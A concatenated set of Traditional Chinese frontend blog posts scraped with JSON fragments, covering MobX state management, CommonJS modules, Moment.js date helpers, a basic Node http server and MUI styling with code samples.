就是一個很基本的導覽列和路由，長得像這樣： 我這邊想做的事情很簡單，就是在 store 中建立一個 isInit 的 state，然後我希望上面紅色框框的兩個按鈕只有在 isInit=true 時才顯示出來。 所以這邊的 store 跟 action 就會這樣寫： 12345678910// storeimport { observable } from 'mobx'export const AuthStorage = observable({ isInit: false, get getIsinit() { return this.isInit }}) 1234567// actionimport { action } from 'mobx'import { AuthStorage } from '../store/auth'export const checkStorage = action(() =&gt; { AuthStorage.isInit = true}) 附註：如果你串過 JWT 的話大概就會知道這是起手式，只是這邊為了簡化所以不會真的去檢查 storage。 接下來，為了在進入頁面時完成「初始化」的動作，我們會用 useEffect 來處理，像這樣： 123456789101112131415161718192021222324// 注意這邊有用 observer 來觀測const App = observer(() =&gt; { console.log('render app') useEffect(() =&gt; { // set isInit to true setTimeout(() =&gt; { checkStorage() }, 1000) }, []) return ( &lt;div className='app'&gt; &lt;HashRouter&gt; &lt;Header /&gt; &lt;Routes&gt; &lt;Route path='' element={&lt;div&gt;hello&lt;/div&gt;} /&gt; &lt;Route path='login' element={&lt;Login /&gt;} /&gt; &lt;/Routes&gt; &lt;/HashRouter&gt; &lt;/div&gt; )})export default App 接下來你可能就很開心的去 &lt;Header /&gt; 中把 isInit 拿出來用，像這樣： 1234567891011121314151617181920212223242526272829303132333435const Header = () =&gt; { return ( &lt;div style={styles.container}&gt; &lt;h1 style={styles.title}&gt; &lt;Link to='/' style={styles.link}&gt; Home &lt;/Link&gt; &lt;/h1&gt; &lt;ul style={styles.list}&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; default &lt;/Link&gt; &lt;/li&gt; {/* 加上條件渲染 */} {AuthStorage.getIsinit &amp;&amp; ( &lt;&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; Link1 &lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; Link2 &lt;/Link&gt; &lt;/li&gt; &lt;/&gt; )} &lt;/ul&gt; &lt;/div&gt; )}export default Header 附註：可以到這邊看 範例 會更清楚 然後你就會發現一秒過後什麼事情也沒發生，跟你想的不一樣。 為什麼？我明明已經用 observer 來觀測整個 App 了啊，照理來說只要有任何 state 改變了不就應該重新渲染嗎？ 要解開這個問題，首先要釐清一件事情：「observer 的觀察範圍在哪裡？」 以上面的例子來說，observer 的觀察範圍就僅限於 App 這個元件本身而已。既然如此，那麼思考一件事情，App 中有沒有用到任何「observable（被觀察）」的值？ 答案是沒有，忘記的話你可以拉上去看一下。 也就是說，只有當 observer 中存在 observable 時，才會再更新時觸發 re-render。（這一句請搞清楚 observer 跟 observable 的差的差別，一個是觀察者，一個是被觀察者） 所以如果要讓 App 觸發 re-render，最簡單的做法就是讓 App 裡面出現 observable，像這樣： 123456789101112131415161718192021222324const App = observer(() =&gt; { console.log('render app') console.log('check observable', AuthStorage.getIsinit) useEffect(() =&gt; { // set isInit be true setTimeout(() =&gt; { checkStorage() }, 1000) }, []) return ( &lt;div className='app'&gt; &lt;HashRouter&gt; &lt;Header /&gt; &lt;Routes&gt; &lt;Route path='' element={&lt;div&gt;hello&lt;/div&gt;} /&gt; &lt;Route path='login' element={&lt;Login /&gt;} /&gt; &lt;/Routes&gt; &lt;/HashRouter&gt; &lt;/div&gt; )})export default App 這時候神奇的事情就發生了，真的觸發 re-render 了： 附註：範例可以參考這邊 就跟我們剛剛說的一樣，現在因為 App 中出現了 observable，所以一旦這個 observable 「被改變了」，App 就應該要 re-render，這就是背後的道理而已，別想得太複雜了。 所以回到一開始的問題，如果我想讓 &lt;Header /&gt; 能正確的被重新渲染的話該怎麼做？ 只要幫他加上 observer 就好（因為 observable 是出現在它裡面的，這個才是我們真正該觀察（observer）的元件）： 1234567891011121314151617181920212223242526272829303132333435// 加上 observerconst Header = observer(() =&gt; { return ( &lt;div style={styles.container}&gt; &lt;h1 style={styles.title}&gt; &lt;Link to='/' style={styles.link}&gt; Home &lt;/Link&gt; &lt;/h1&gt; &lt;ul style={styles.list}&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; default &lt;/Link&gt; &lt;/li&gt; {AuthStorage.getIsinit &amp;&amp; ( &lt;&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; Link1 &lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; Link2 &lt;/Link&gt; &lt;/li&gt; &lt;/&gt; )} &lt;/ul&gt; &lt;/div&gt; )})export default Header 附註：範例參考這裡 總之，一定要搞清楚 observer 的涵蓋範圍在哪裡？它跟 observable 的關係又是什麼？是一段想講的重要觀念。 關於 toJS（深拷貝）這邊是我後來在做專案時碰到的一個問題，所以記錄一下。 簡單來說上面的範例其實可以再利用 computed 的方式來取出 state，像這樣： 123456789101112131415export const TodoStorage = observable({ // 存在 store 中的 state todos: [ { id: 1, name: 'Test', completed: true } ] as Todo[], // 把 state 直接當作 computed 傳出去 get getTodos(): Todo[] { return this.todos }}) 用的時候會像這樣： 12345678910111213const TodoList: React.FC = observer(() =&gt; { return ( &lt;&gt; &lt;ul&gt; {TodoStorage.getTodos.map((item) =&gt; ( &lt;li onClick={() =&gt; toggleTodo(item.id)} key={item.id}&gt; {item.name} &lt;/li&gt; ))} &lt;/ul&gt; &lt;/&gt; )}) 你可能會想說明明能用 TodoStorage.todos 拿出來就好了，為什麼要這樣寫？ 這是因為單用 TodoStorage.todos 拿出來的話： 他是有被修改的風險在的 他是有被修改的風險在的 他是有被修改的風險在的 因為我們拿出來的東西其實是「reference」，所以我只要在拿出來的時候亂改，就會改到「原本放在 store」 裡面的東西，像這樣： 1234567891011121314151617181920212223242526import React from 'react'import { TodoStorage } from '../state/storage/todo'import { toggleTodo } from '../state/action/todo'import { observer } from 'mobx-react-lite'const TodoList: React.FC = observer(() =&gt; { // 拿出來後亂改 TodoStorage.todos[0].name = 'yoyoyo' return ( &lt;&gt; &lt;ul&gt; {TodoStorage.todos.map((item) =&gt; { return ( &lt;li onClick={() =&gt; toggleTodo(item.id)} key={item.id}&gt; {/* 原本是 test，但會被改成 yoyoyo */} {item.name} &lt;/li&gt; ) })} &lt;/ul&gt; &lt;/&gt; )})export default TodoList 附註：不懂的話可以到這邊看範例 所以比較保險的方式是先把 state 做深拷貝以後再拿出來，這樣子就算之後意外的改到 state，那也不會影響到 store 裡面的東西（這個就是深拷貝的原理，不懂的話回去複習）。 這時候就會用到 toJS 這個方法了，來把一開始講的方法改成這樣： 1234567891011121314export const TodoStorage = observable({ todos: [ { id: 1, name: \"Test\", completed: true } ] as Todo[], get getTodosWithToJS(): Todo[] { // 做深拷貝後在回傳 return toJS(this.todos); }}); 12345678910111213141516171819202122232425import React from 'react'import { TodoStorage } from '../state/storage/todo'import { toggleTodo } from '../state/action/todo'import { observer } from 'mobx-react-lite'const TodoList: React.FC = observer(() =&gt; { // 一樣亂改值，但只會改到拷貝後的物件 TodoStorage.getTodosWithToJS[0].name = 'yoyoyo' return ( &lt;&gt; &lt;ul&gt; {TodoStorage.todos.map((item) =&gt; { return ( &lt;li onClick={() =&gt; toggleTodo(item.id)} key={item.id}&gt; {/* 不會影響到原本的 todos */} {item.name} &lt;/li&gt; ) })} &lt;/ul&gt; &lt;/&gt; )})export default TodoList 不懂的話一樣來這邊看範例。 總之呢，toJS 通常是用在你「想要拿 state 來做一些計算時」會拿來用的東西，為的就是避免在途中不小心改到 store 裡的東西，所以才會用這種方式來盡可能避免掉。 如果你的 state 只是純粹拿來 Read 的話，那不用這種方式也沒關係，但要知道要有這種作法就是了。 最後的附註：雖然準確一點來說 toJS 的用途是「取消 observable」，不過我覺得用「深拷貝」的方式來理解會更好懂一點（當初完全聽不懂什麼叫取消 observable XD）","link":"/2022/05/14/mobx-another-way-to-set-up/"},{"title":"來點不一樣的狀態管理 mobx","text":"其實比 React 簡單很多。 簡述最近因為工作的關係，得學習新的工具。 以 React 來舉例的話，講到狀態管理大家第一個想到的應該是 redux，不過前輩建議我們要多學新的東西，所以這次的專案不用 redux 而是 mobx。 我覺得這樣還蠻好的，雖然要花時間學新東西，不過也蠻有趣的。 簡單來說，mobx 也是一個狀態管理的工具，不過他比 redux 更簡單一些，也不需要太多的前置作業（boilerplate），只要掌握 action、observe 和 computed 幾個觀念就差不多了。 四大要素 store（class）儲存所有資訊的地方 observale 要觀察的 state action 用來更新 state 的 function computed 告訴你 store 裡面的資訊（類似 derived state 的概念） 來一個簡單的 Todo list凡事從 todo list 開始都會吸收蠻快的，所以這邊一樣會做一個來當示範。 建立基本元件這邊為了方便起見，不會把元件拆的太細，只會建立一個 TodoList，大概長這樣： 1234567891011121314151617181920import React, { useState } from \"react\";// 先留空，等會兒要把 store 給當作 props 傳進來interface Props {}export const TodoList: React.FC&lt;Props&gt; = (props) =&gt; { const [value, setValue] = useState&lt;string&gt;(\"\"); return ( &lt;div&gt; &lt;form onSubmit={e =&gt; { e.preventDefault(); }}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;button type=\"submit\"&gt;submit&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; )} 建立 store接著要來建立 store 的部分。 在那之前先解釋一下，mobx 跟 redux 最大的不同不需要一大堆前置作業，如果專案不大的話，其實一個檔案就蠻夠用了。 首先要建立一個 class，這個 class 就代表 store 的藍圖，然後我們要做下面這幾件事： 建立 todos 內容（state） 讓 todos 變成「observable」（可觀察的） 建立 action（修改 todos） 大致上是這樣，剩下的部分用 code 來說明： 123456789101112131415161718192021222324252627282930313233import { action, makeObservable, observable } from \"mobx\"interface TodoItem { id: number, name: string, completed: boolean}class TodoStoreImpl { // 建立一個 todos 的屬性 // 這個屬性就是給其他人存取的 state todos: TodoItem[] = [] // 這邊會用 makeObservable 來初始化 // 用途是告訴 mobx 他要觀察哪些 state // 還有我們有哪些 action 跟 computed（這個後面會再介紹） constructor() { makeObservable(this, { todos: observable, addTodo: action }) } // action，說穿了就是一個 function 而已 addTodo(name: string): void { const item: TodoItem = { id: new Date().getTime(), name, completed: false } this.todos.push(item); }} 看完上面的 code 你應該就大概知道 action, makeObservable, observable 的用途是什麼了。 這邊只補充一下 makeObservable，他會接收兩個參數： store 的 instance（this） store 裡的所有 property 此外，應該有注意到在 addTodo 時竟然可以用「mutable」的方式來更新 state？ 這個是 mobx 的一個特點，讓你可以用 mutable 的方式來更新 state，就跟 redux-tool-kit 的概念有點像，應該是會在背後幫你做一些處理（應該啦，我沒深究）。 最後，因為所有的 Component 會共用同一個 instance，所以我們真正要 export 出去的會是 new 出來的東西，而不是 class 本身。 所以這邊要 new 一個 instance 出來，再把他 export 出去： 12345678910111213141516171819202122232425262728293031import { action, makeObservable, observable } from \"mobx\"interface TodoItem { id: number, name: string, completed: boolean}// 這邊 export 的用途是拿來給 typescript 用的export class TodoStoreImpl { todos: TodoItem[] = [] constructor() { makeObservable(this, { todos: observable, addTodo: action }) } addTodo(name: string): void { const item: TodoItem = { id: new Date().getTime(), name, completed: false } this.todos.push(item); }}// 把 instance 輸出export const TodoStore = new TodoStoreImpl(); 接著回到 index.js 的部分，它要做的事情只有一個，就是「把 store 引入，然後傳給 TodoList」： 123456789101112131415import React from 'react';import ReactDOM from 'react-dom/client';import './index.css';import TodoList from './TodoList';// 引入 storeimport { TodoStore } from './TodoStore';const root = ReactDOM.createRoot( document.getElementById('root') as HTMLElement);root.render( // 當作 props 傳下去 &lt;TodoList todoStore={TodoStore} /&gt;); 最後再回來調整一下 TodoList 的部分，既然現在已經拿到 store 了，就代表它可以透過 store 來存取 todos 跟 addTodo 這兩個東西。 所以可以改成這樣： 1234567891011121314151617181920212223242526272829303132import React, { useState } from \"react\";import { TodoStoreImpl } from \"./TodoStore\";// 幫 props 設定 typeinterface Props { todoStore: TodoStoreImpl}// 透過 props 拿到 todoStoreexport const TodoList: React.FC&lt;Props&gt; = ({ todoStore }) =&gt; { const [value, setValue] = useState&lt;string&gt;(\"\"); return ( &lt;div&gt; &lt;form onSubmit={e =&gt; { e.preventDefault(); if (value) { // 透過 store 呼叫 addTodo todoStore.addTodo(value); setValue(\"\"); } }}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;button type=\"submit\"&gt;submit&lt;/button&gt; &lt;/form&gt; {/* 透過 store 拿到 state 的資訊 */} &lt;ul&gt; {todoStore.todos.map(todo =&gt; &lt;li key={todo.id}&gt;{todo.name}&lt;/li&gt;)} &lt;/ul&gt; &lt;/div&gt; )} 關於 observer 和 HOC做到這邊，你應該就可以新增 todo，然後透過 action 去改變 store 裡面的 todos。可是你會發現一個問題，那就是畫面不會更新。 附註：雖然我實作的結果其實是會更新，但不確定是不是 mobx 後來有做什麼更新的原因，總之還是避免這樣寫比較好。 為什麼？ 這是因為當我們新增 todo 時，會改變的是 store 裡的 property，而不是 todoStore 這個 props（instance）。 既然 props 沒有變，Component 自然就不會 re-render，畫面也當然不會更新。 所以呢，除了把 todoStore 傳給 Component 以外，還要幫 Component 用一層 observale 包住，也就是 HOC（Higher Order Component）的手法： 123456789101112131415161718192021222324252627282930import { observer } from \"mobx-react-lite\";import React, { useState } from \"react\";import { TodoStoreImpl } from \"./TodoStore\";interface Props { todoStore: TodoStoreImpl}// 不太懂的話可以想成這樣：observer(&lt;TodoList /&gt;)export const TodoList: React.FC&lt;Props&gt; = observer(({ todoStore }) =&gt; { const [value, setValue] = useState&lt;string&gt;(\"\"); return ( &lt;div&gt; &lt;form onSubmit={e =&gt; { e.preventDefault(); if (value) { todoStore.addTodo(value); setValue(\"\"); } }}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;button type=\"submit\"&gt;submit&lt;/button&gt; &lt;/form&gt; &lt;ul&gt; {todoStore.todos.map(todo =&gt; &lt;li key={todo.id}&gt;{todo.name}&lt;/li&gt;)} &lt;/ul&gt; &lt;/div&gt; )}) 做到這邊以後，畫面應該就會自動更新了： 接著請你自己再做一個 toggleTodo 的功能，並且畫面上顯示已完成 / 未完成的狀態（概念都差不多，所以這邊就不示範了）。 computed最後要介紹的是 computed，顧名思義是用來做「計算」的東西。在這個例子裡，我們可以拿它來計算 todo 的已完成 / 未完成數量： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import { action, computed, makeObservable, observable } from \"mobx\";interface TodoItem { id: number; name: string; completed: boolean;}export class TodoStoreImpl { todos: TodoItem[] = []; constructor() { makeObservable(this, { todos: observable, addTodo: action, toggleTodo: action, states: computed // 記得一樣要放到這邊初始化 }); } addTodo(name: string): void { const item: TodoItem = { id: new Date().getTime(), name, completed: false }; this.todos.push(item); } toggleTodo(id: number): void { const index = this.todos.findIndex((item) =&gt; item.id === id); if (index &gt; -1) { this.todos[index].completed = !this.todos[index].completed; } } // 要用 get 關鍵字來宣告 computed get states() { let completed: number = 0; let remaining: number = 0; // 計算已完成 / 未完成數量 this.todos.forEach((item) =&gt; { if (item.completed) { completed++; } else { remaining++; } }); return { completed, remaining }; }}export const TodoStore = new TodoStoreImpl(); 做到這邊後，其實就差不多把 mobx 的基礎學完了，恭喜恭喜！ 如果你想參考原始碼的話可以到這邊。","link":"/2022/05/13/mobx-basic/"},{"title":"模組化的輸出與輸入","text":"希望可以搞懂它。 三巨頭標準 Asynchronous Module Definition（AMD） 非同步模組定義。可以想成是從 CommonJS 延伸出來的另一個標準，目的是提升瀏覽器在載入模組的效能。 CommonJS（CMJ） 就是等下要介紹的東西，特別注意這種模組是用 同步 來載入模組的。 ES6（ESM）的 import 與 export 之後出來的一個新標準，可以在 Node.js 跟瀏覽器上跑，詳細介紹可以參考 ES6 的模組機制。 注意事項這篇文章介紹的模組機制是「CommonJS」的標準，而採用這套標準的執行環境是「Node.js」，不是瀏覽器。也就是說 你沒辦法在瀏覽器上用這套標準。 如果你曾經看過有些瀏覽器上可以用，那也許是真的。不過正確一點的說法是「用了某些工具讓瀏覽器可以支援」才對，所以請不要誤會了。 輸出一個 module 給別人假設我想寫一個 module 給別人用，那我可以這樣寫： 12345// myModule.jsfunction double(n) { return n * 2}module.exports = double module.exports 就是用來「把你想輸出的內容」給輸出。 在上面的例子裡我輸出了一個 function，但其實也可以改成 123 或 'Hello' 或是 {name: 'PeaNu'} 等等，只要是符合 JavaScript 中的資料型態都可以。 載入寫好的 module剛剛已經寫好 module 的部分了，接著我們要來載入： 123// main.jsvar myModule = require('./myModule')console.log(myModule) // [Function: double] require 就是用來「把你想輸入的內容」給輸入。 記得要指定一個變數來儲存引入的模組，接著這個變數就等同於剛剛寫好的模組。 所以把 myModule 印出來看就會得到剛剛寫好的 function： double 如果到這裡都沒問題的話，就可以使用模組了： 12var myModule = require('./myModule')console.log(myModule(100)) // 200 另外一種輸出方式exports 是另外一種輸出方式，跟 module.exports 不同的地方是「只能以物件格式輸出」： 12345// myModule.jsfunction double(n) { return n * 2}exports.double = double 所以引入的時候，只會拿到一個物件： 12var myModule = require('./myModule')console.log(myModule) // { double: [Function: double] } 簡單來說，你可以把 exports 想成是這樣： 12345{ double: function double(n) { return n * 2 }} 它不像 module.exports 那麼有彈性，想輸出什麼就輸出什麼，所以這個可能比較少用一點。 輸出多個內容剛剛只有輸出一個 function，現在來多輸出幾個。 module.exports 12345678910function double(n) { return n * 2}function triple(n) { return n * 3}module.exports = { double: double, triple: triple} 1234var myModule = require('./myModule')console.log(myModule) // { double: [Function: double], triple: [Function: triple] }console.log(myModule.double(2)) // 4console.log(myModule.triple(2)) // 6 exports 12345678function double(n) { return n * 2}function triple(n) { return n * 3}exports.double = doubleexports.triple = triple 1234var myModule = require('./myModule')console.log(myModule) // { double: [Function: double], triple: [Function: triple] }console.log(myModule.double(2)) // 4console.log(myModule.triple(2)) // 6 為什麼要有模組？既然已經會使用了，那就要來談談為什麼要用它？ 其實換個角度想就好了，如果沒有模組的話會怎麼樣？ 舉個例子，假設我有兩個檔案，分別是 login.js 跟 form.js。這兩個檔案都想用一個 function 來做「信箱驗證」的動作。在沒有模組的情況下只能這樣子做： 12345// login.jsfunction validEmail() { ...}validEmail(...) 12345// form.jsfunction validEmail() { ...}validEmail(...) 你應該能發現問題很明顯： 有幾個檔案要用，就要宣告幾個 validEmail 如果要修改 validEmail，那每一個檔案都得開起來一個一個改 但如果是模組化，就只會有兩個動作： 我要用 validEmail，就用一個變數來儲存 require 引入進來的東西 如果要修改 validEmail，我只要去這個模組的檔案修改就好 基於這兩點，其實就沒有不使用模組化的理由。","link":"/2021/12/23/module/"},{"title":"Moment.js 筆記","text":"把一些常用到的操作給記錄下來。 簡述底下介紹的所有範例可以到 Codepen 上參考。 add（加時間）小陷阱：注意這是用 mutable 的方式來改資料，所以請避免直接對儲存 moment 的 state 使用 12345678let A = moment('2020-01-01')let B = moment('2020-01-01')let C = moment('2020-01-01')console.log(A.add(1, 'days').format('YYYY/MM/DD')) // 2020/01/02console.log(A.format('YYYY/MM/DD')) // 2020/01/02 (mutable changed)console.log(B.add(1, 'months').format('YYYY/MM/DD')) // 2020/02/01console.log(C.format('LTS')) // 12:00:00 AMconsole.log(C.add(5, 'hours').format('LTS')) // 5:00:00 AM subtract（減時間）小陷阱：注意這是用 mutable 的方式來改資料，所以請避免直接對儲存 moment 的 state 使用 12345678let A = moment('2020-01-10')let B = moment('2020-01-10')let C = moment('2020-01-10')console.log(A.subtract(7, 'days').format('YYYY/MM/DD')) // 2020/01/03console.log(A.format('YYYY/MM/DD')) // 2020/01/09 (mutable changed)console.log(B.subtract(1, 'months').format('YYYY/MM/DD')) // 2020/02/01console.log(C.format('LTS')) // 12:00:00 AMconsole.log(C.subtract(5, 'hours').format('LTS')) // 7:00:00 PM diff（比較天數）1234let A = moment('2020-01-01')let B = moment('2020-01-02')console.log(A.diff(B, 'days')) // -1console.log(B.diff(A, 'days')) // 1 endOf / startOf123let A = moment('2020-01-01')console.log(A.endOf('day').format('LTS')) // 11:59:59 PMconsole.log(A.startOf('day').format('LTS')) // 12:00:00 AM 確認格式是否正確假設要確認格式是否為 13/09/2022(DD/MM/YYYY)： 1234moment('13/09/2022', 'DD/MM/YYYY', true).isValid() // truemoment('01/13/2022', 'DD/MM/YYYY', true).isValid() // falsemoment('123', 'DD/MM/YYYY', true).isValid() // falsemoment('abc', 'DD/MM/YYYY', true).isValid() // false 實際例子（Antd）StartDate &gt;= EndDate： 123456const selectedEndDate = moment('2022-09-02')&lt;DatePicker disabledDate={(currentDate: moment.Moment) =&gt; currentDate.startOf('day').diff(selectedEndDate.startOf('day'), 'days') &gt; 0}/&gt; EndDate &lt;= StartDate： 123456const selectedStartDate = moment('2022-09-02')&lt;DatePicker disabledDate={(currentDate: moment.Moment) =&gt; currentDate.startOf('day').diff(selectedStartDate.startOf('day'), 'days') &lt; 0}/&gt; 這邊建議比較時**最好把 A 跟 B 都加上 startOf('day')**，確保兩者的時間（時/分/秒）是分秒不差的，否則有可能會出現少一天 or 多一天的問題。","link":"/2022/09/25/moment-js/"},{"title":"建立一個最基本的 http-server","text":"沒有那麼複雜。 原始碼備註：res.end() 的意思不是結束。是送出 response 的意思。 1234567891011121314151617181920212223242526272829// 引入 http 模組const http = require('http')// 伺服器的相關設定const server = http.createServer((req, res) =&gt; { // 當存取 '/' 時，回傳 welcome if(req.url === '/') { res.write('Welcome') res.end() return } // 當存取 '/hello' 時，回傳 hello if(req.url === '/hello') { res.write('hello') res.end() return } // 當存取 '/redirect' 時，回傳 302 狀態碼，以及要導向的網址 if(req.url === '/redirect') { res.writeHead(302, { 'Location': 'https://google.com/' }) res.end() return } // 當存取不存在的資源 時，回傳 404 狀態碼 res.writeHead(404) res.end()})server.listen(5000) // 提供 xxx 服務的意思（NBA 即時賽況）","link":"/2022/01/04/most-basic-http-server/"},{"title":"MUI 筆記","text":"非常好用。 基礎應用這邊是比較偏 CSS 的應用，推薦可以把官方文件的 system 部分給看完，這邊只會列幾個我想特別記一下的。 sx 屬性這應該是 MUI 裡面最重要的一個東西。 簡單來說只要是 MUI 的組件都可以用 sm 這個 props，他基本上就跟 style 的用途差不多，但重點有兩個： 他不是 inline-style（絕對別搞錯囉） 可以用 MUI 專屬的 utils 來寫樣式（當 tailwind 在寫 XD） 所以如果想畫一個簡單的方塊 我可以這樣寫： 1234567891011121314151617181920export default function Color() { return ( &lt;div&gt; &lt;Box sx={{ width: 1 / 2, // 50% color: 'white', textAlign: 'center', fontWeight: 'bold', background: 'dodgerblue', borderRadius: '4px', py: 1, // 1 = 8px px: 2 // 2 = 16px }} &gt; Box1 &lt;/Box&gt; &lt;/div&gt; )} 因為 sx 很好用的關係，所以當你用了 MUI 以後通常會直接拿 &lt;Box&gt; 來取代 &lt;div&gt;。 SpacingMUI 預設的間距是 8px，所以只要跟間距有關的設定都會拿 8px 來當作基準，像是常見的 margin 跟 bottom 就會這樣寫： 123456789101112131415161718192021export default function Spacing() { const boxStyle = (bg) =&gt; ({ width: 1 / 2, color: 'white', textAlign: 'center', fontWeight: 'bold', background: bg, borderRadius: '4px', py: 1, // 1 = 8px px: 2, // 2 = 16px mt: 2, // 16px ml: 4 }) return ( &lt;div style={{ margin: 50 }}&gt; &lt;Box sx={boxStyle('dodgerblue')}&gt;Box1&lt;/Box&gt; &lt;Box sx={boxStyle('cadetblue')}&gt;Box1&lt;/Box&gt; &lt;/div&gt; )} Shadow這個是懶的時候很好用（雖然私心覺得 Tailwind 的 shadow 寫得更自然一些） 1234567891011121314151617181920export default function Shadow() { const boxStyle = { width: 1 / 2, color: '#555', textAlign: 'center', background: 'white', borderRadius: '4px', boxShadow: 1, // shadow py: 1, px: 2, m: 4 } return ( &lt;div style={{ margin: 50 }}&gt; &lt;Box sx={boxStyle}&gt;Box1&lt;/Box&gt; &lt;Box sx={boxStyle}&gt;Box1&lt;/Box&gt; &lt;/div&gt; )} breakpoint透過 sx 設定的樣式都可以在指定「在哪個 breakpoint 下套用」的規則，像這樣： 12345678910111213141516171819202122export default function BreakPoint() { const boxStyle = { width: { xs: 1, // minWidth &gt; 0px sm: 1 / 2 // minWidth &gt; 600px }, color: 'white', background: 'dodgerblue', textAlign: 'center', borderRadius: '4px', py: 1, px: 2, mt: 2 } return ( &lt;div&gt; &lt;Box sx={boxStyle}&gt;Box1&lt;/Box&gt; &lt;Box sx={boxStyle}&gt;Box1&lt;/Box&gt; &lt;/div&gt; )} 預設的斷點是： xs: 0px sm: 600px md: 900px lg: 1200px xl: 1536px 這個做 RWD 必備，所以記得學起來。不懂的話可以到這邊 範例 來看，我就不貼圖了。 display這個就是用來設定 block、inline-block 等等之類的東西，跟 style 的寫法大同小異，所以這邊想特別講的是 textOverflow 的用法，只要搭配 &lt;Box&gt; 來用就能很輕鬆的做出 … 的效果： 123456789101112131415161718192021222324export default function TextOverflow() { const boxStyle = { width: 1, color: 'white', background: 'dodgerblue', overflow: 'hidden', // required whiteSpace: 'nowrap', // required textAlign: 'center', borderRadius: '4px', textOverflow: 'ellipsis', // required py: 1, // 1 = 8px px: 2, // 2 = 16px mt: 2 } return ( &lt;div&gt; &lt;Box sx={boxStyle}&gt; Lorem Ipsum is simply dummy text Lorem Ipsum is simply dummy text Lorem Ipsum is simply dummy text &lt;/Box&gt; &lt;/div&gt; )} 不懂的話一樣能能參考我寫的範例。 Palette（調色盤）簡單來說像 color 跟 bgcolor 這兩個東西可以直接用指定的字串來存取 MUI 的基本配色，像這樣： 寫法也很簡單： 1234567891011121314151617181920212223export default function Color(bg) { const boxStyle = (bg) =&gt; ({ width: 1, color: 'white', bgcolor: bg, overflow: 'hidden', whiteSpace: 'nowrap', textAlign: 'center', borderRadius: '4px', textOverflow: 'ellipsis', py: 2, mt: 2 }) return ( &lt;div&gt; &lt;Box sx={boxStyle('primary.main')}&gt;primary&lt;/Box&gt; &lt;Box sx={boxStyle('secondary.main')}&gt;secondary&lt;/Box&gt; &lt;Box sx={boxStyle('success.main')}&gt;success&lt;/Box&gt; &lt;Box sx={boxStyle('warning.main')}&gt;warning&lt;/Box&gt; &lt;/div&gt; )} 範例到 這邊 看。至於字體顏色的用法也差不多，想知道更多的話看 官方文件 比較快。 TextField這個寫表單的時候會蠻常用到的，這邊想特別記的幾個 props 有幾個： required helperText Error InputProps (ReadOnly) multiline 演示的部分可以參考這裡。 ThemeProvider想參考預設值的話可以到 官方文件 看。 如果你想要覆蓋 MUI 預設的一些樣式，像是「顏色」、「間距」、「字體」和「陰影」之類的設定的話，可以用 ThemeProvider 的方式來覆寫。 來看一個最簡單的例子，假設我想把 primary 色改掉，那我可以這樣寫： 123456789101112131415161718import { createTheme, ThemeProvider } from '@mui/material/styles'const theme = createTheme({ palette: { primary: { main: '#8d69f1' } }})ReactDOM.render( &lt;React.StrictMode&gt; &lt;ThemeProvider theme={theme}&gt; &lt;App /&gt; &lt;/ThemeProvider&gt; &lt;/React.StrictMode&gt;, document.getElementById('root')) 他背後是用 Context 來實作的，所以這例子的底下所有用到 primary 色的組件都會變成我寫的顏色。 如果我不想要他的 scope 那麼大，那就把 ThemeProvider 放在對應的組件上就好，像這樣： 12345678910export default function BasicButtons() { return ( &lt;Stack spacing={2} direction='row'&gt; &lt;ThemeProvider theme={theme}&gt; &lt;Button variant='contained'&gt;Contained&lt;/Button&gt; &lt;/ThemeProvider&gt; &lt;Button variant='contained'&gt;Contained&lt;/Button&gt; &lt;/Stack&gt; )} useTheme 的用法有時候你可能想寫一些 inline-style，但你想直接拿 MUI 寫好的樣式來用，這時候你就可以用 useTheme 來把對應的值取出來。 例如根據不同長度的文字我想套用不同的顏色： 123456789101112131415161718192021222324252627import { useTheme } from '@mui/material/styles'import { Typography } from '@mui/material'export default function BasicButtons() { // 透過他我就能存取所有 MUI 的樣式設定 const theme = useTheme() const title1 = 'short Text' const title2 = 'I an long short Text' const getTypeStyle = (text, theme) =&gt; { return { color: text.length &lt; 15 ? theme.palette.primary.main : theme.palette.secondary.main } } // spacing(1) = 8px return ( &lt;div style={{ margin: theme.spacing(4) }}&gt; &lt;Typography style={getTypeStyle(title1, theme)} variant='h6' component='div' gutterBottom&gt; {title1} &lt;/Typography&gt; &lt;Typography style={getTypeStyle(title2, theme)} variant='h6' component='div' gutterBottom&gt; {title2} &lt;/Typography&gt; &lt;/div&gt; )} 可以直接當作 utility 來用，我覺得還蠻方便的。 關於 Selectbox 的一個小雷點這邊只是記錄一下當初覺得很雷的 bug。 我原本預期結果是這樣子： 但出來的結果是這樣子： 就是 label 的部分總會超出 border 的線條，當初找了蠻久才找到解法。 簡單來說 border 會隨著 &lt;Select&gt; 的 label 來做調整，所以你一定要讓它的值跟顯示的 &lt;InputLabel&gt; 的內容是一樣的： 123456789101112131415161718192021222324&lt;FormControl&gt; &lt;InputLabel&gt;Project Detail&lt;/InputLabel&gt; &lt;Select label='Project Detail' // 這個要跟上面的 &lt;InputLabel&gt; 對應 multiple value={personName} onChange={(e) =&gt; setPersonName(e.target.value)} renderValue={(selected) =&gt; { return ( &lt;Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 1 }}&gt; {selected.map((value) =&gt; ( &lt;Chip variant='outlined' key={value} label={value} /&gt; ))} &lt;/Box&gt; ) }} &gt; {names.map((name) =&gt; ( &lt;MenuItem key={name} value={name}&gt; {name} &lt;/MenuItem&gt; ))} &lt;/Select&gt;&lt;/FormControl&gt; 客製化 CSSsx 屬性這是最簡單也是最推薦的作法，就是用 sx 屬性來改： 1234567891011export default function SxProp() { return ( &lt;Slider defaultValue={30} sx={{ width: 300, color: 'success.main' }} /&gt; )} 可以看到這邊寫的樣式會出現在 .css-121j95d-MuiSlider-root 中。如果要用純 CSS 來做的話就無法了，因為 class 中有 hash 值。 在 sx 中使用 selector一個元件通常是由多個 part 來組成的，像上面的 Slider 中就包含了 rail、track 和 thumb 這幾個部位： 